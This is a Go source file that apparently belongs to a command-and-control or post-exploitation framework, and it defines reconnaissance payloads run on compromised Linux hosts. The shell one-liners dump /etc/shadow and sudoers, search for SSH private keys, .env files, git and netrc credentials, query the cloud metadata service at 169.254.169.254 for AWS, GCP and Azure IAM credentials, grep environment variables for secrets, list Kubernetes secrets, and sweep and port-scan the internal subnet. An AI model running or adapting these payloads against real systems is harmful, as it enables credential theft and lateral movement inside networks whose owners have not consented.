package engine

import (
	"encoding/json"
	"log"
)

type reconConfig struct {
	Modules []string `json:"modules"`
}

var reconModules = map[string]TaskTemplate{
	"sysinfo": {
		Name:    "System Information",
		CmdType: "shell",
		Payload: `echo "=== HOSTNAME ===" && hostname -f 2>/dev/null || hostname && echo "=== KERNEL ===" && uname -a && echo "=== OS ===" && cat /etc/os-release 2>/dev/null && echo "=== UPTIME ===" && uptime && echo "=== MEMORY ===" && free -h 2>/dev/null && echo "=== DISK ===" && df -h && echo "=== CPU ===" && grep "model name" /proc/cpuinfo 2>/dev/null | head -1 && echo "cores: $(nproc 2>/dev/null)"`,
	},
	"network": {
		Name:    "Network Enumeration",
		CmdType: "shell",
		Payload: `echo "=== INTERFACES ===" && (ip addr 2>/dev/null || ifconfig 2>/dev/null) && echo "=== ROUTES ===" && (ip route 2>/dev/null || netstat -rn 2>/dev/null) && echo "=== DNS ===" && cat /etc/resolv.conf 2>/dev/null && echo "=== LISTENING PORTS ===" && (ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null) && echo "=== ESTABLISHED ===" && (ss -tnp 2>/dev/null || netstat -tnp 2>/dev/null) && echo "=== ARP TABLE ===" && (ip neigh 2>/dev/null || arp -a 2>/dev/null) && echo "=== HOSTS FILE ===" && cat /etc/hosts`,
	},
	"users": {
		Name:    "User Enumeration",
		CmdType: "shell",
		Payload: `echo "=== CURRENT USER ===" && id && echo "=== LOGGED IN ===" && w && echo "=== LAST LOGINS ===" && last -n 20 2>/dev/null && echo "=== PASSWD ===" && cat /etc/passwd && echo "=== SHADOW ===" && cat /etc/shadow 2>/dev/null && echo "=== SUDOERS ===" && cat /etc/sudoers 2>/dev/null && echo "=== SUDO -L ===" && sudo -l 2>/dev/null && echo "=== SSH KEYS ===" && find /home -name "authorized_keys" -o -name "id_rsa" -o -name "id_ed25519" 2>/dev/null && echo "=== CRONTABS ===" && for u in $(cut -f1 -d: /etc/passwd); do echo "--- $u ---"; crontab -l -u $u 2>/dev/null; done`,
	},
	"software": {
		Name:    "Installed Software",
		CmdType: "shell",
		Payload: `echo "=== PACKAGES ===" && (dpkg -l 2>/dev/null | tail -50 || rpm -qa 2>/dev/null | tail -50) && echo "=== PYTHON ===" && (pip3 list 2>/dev/null || pip list 2>/dev/null) && echo "=== RUNNING SERVICES ===" && (systemctl list-units --type=service --state=running 2>/dev/null || service --status-all 2>/dev/null) && echo "=== SUID BINARIES ===" && find / -perm -4000 -type f 2>/dev/null | head -30 && echo "=== WRITABLE DIRS ===" && find / -writable -type d 2>/dev/null | grep -v proc | head -20`,
	},
	"cloud": {
		Name:    "Cloud Metadata & Credentials",
		CmdType: "shell",
		Payload: `echo "=== AWS METADATA ===" && curl -s --connect-timeout 2 http://169.254.169.254/latest/meta-data/ 2>/dev/null && echo "" && echo "=== AWS IDENTITY ===" && curl -s --connect-timeout 2 http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null && echo "" && echo "=== AWS CREDS ===" && cat ~/.aws/credentials 2>/dev/null && echo "=== GCP METADATA ===" && curl -s --connect-timeout 2 -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/ 2>/dev/null && echo "" && echo "=== GCP CREDS ===" && cat ~/.config/gcloud/credentials.db 2>/dev/null && echo "=== AZURE METADATA ===" && curl -s --connect-timeout 2 -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>/dev/null && echo "" && echo "=== ENV SECRETS ===" && env | grep -iE "(key|secret|token|pass|api)" 2>/dev/null`,
	},
	"containers": {
		Name:    "Container Enumeration",
		CmdType: "shell",
		Payload: `echo "=== IN CONTAINER? ===" && cat /proc/1/cgroup 2>/dev/null | head -5 && echo "=== DOCKER ===" && docker ps -a 2>/dev/null && echo "=== DOCKER IMAGES ===" && docker images 2>/dev/null && echo "=== DOCKER SOCK ===" && ls -la /var/run/docker.sock 2>/dev/null && echo "=== KUBERNETES ===" && kubectl get pods -A 2>/dev/null && echo "=== K8S SECRETS ===" && kubectl get secrets -A 2>/dev/null && echo "=== K8S CONFIGMAPS ===" && kubectl get configmaps -A 2>/dev/null`,
	},
	"sensitive_files": {
		Name:    "Sensitive File Discovery",
		CmdType: "shell",
		Payload: `echo "=== PRIVATE KEYS ===" && find / -maxdepth 5 -type f \( -name "*.pem" -o -name "*.key" -o -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" \) 2>/dev/null | head -30 && echo "=== CONFIG FILES ===" && find / -maxdepth 5 -type f \( -name "*.env" -o -name ".env*" -o -name "wp-config.php" -o -name "config.json" -o -name "settings.py" -o -name "database.yml" -o -name "credentials*" \) 2>/dev/null | head -30 && echo "=== HISTORY ===" && cat ~/.bash_history 2>/dev/null | tail -50 && echo "=== SSH CONFIG ===" && cat ~/.ssh/config 2>/dev/null && echo "=== GIT CREDENTIALS ===" && cat ~/.git-credentials 2>/dev/null && echo "=== NETRC ===" && cat ~/.netrc 2>/dev/null`,
	},
	"internal_network": {
		Name:    "Internal Network Scan",
		CmdType: "shell",
		Payload: `echo "=== SUBNET DISCOVERY ===" && SUBNET=$(ip route | grep -v default | grep "src" | head -1 | awk '{print $1}') && echo "Scanning: $SUBNET" && BASE=$(echo $SUBNET | cut -d'/' -f1 | cut -d'.' -f1-3) && for i in $(seq 1 254); do (ping -c 1 -W 1 ${BASE}.$i &>/dev/null && echo "ALIVE: ${BASE}.$i") & done; wait && echo "=== COMMON PORTS ===" && for h in $(ip neigh | grep REACHABLE | awk '{print $1}'); do for p in 22 80 443 3306 5432 6379 8080 8443; do (echo >/dev/tcp/$h/$p 2>/dev/null && echo "OPEN: $h:$p") & done; done; wait 2>/dev/null`,
	},
}

func ReconTasks(config string) []TaskTemplate {
	var cfg reconConfig
	if err := json.Unmarshal([]byte(config), &cfg); err != nil {
		log.Printf("[-] Recon: invalid config, using defaults: %v", err)
	}

	if len(cfg.Modules) == 0 {
		cfg.Modules = []string{"sysinfo", "network", "users", "software", "cloud", "containers", "sensitive_files", "internal_network"}
	}

	var tasks []TaskTemplate
	for _, mod := range cfg.Modules {
		if t, ok := reconModules[mod]; ok {
			tasks = append(tasks, t)
		}
	}
	return tasks
}
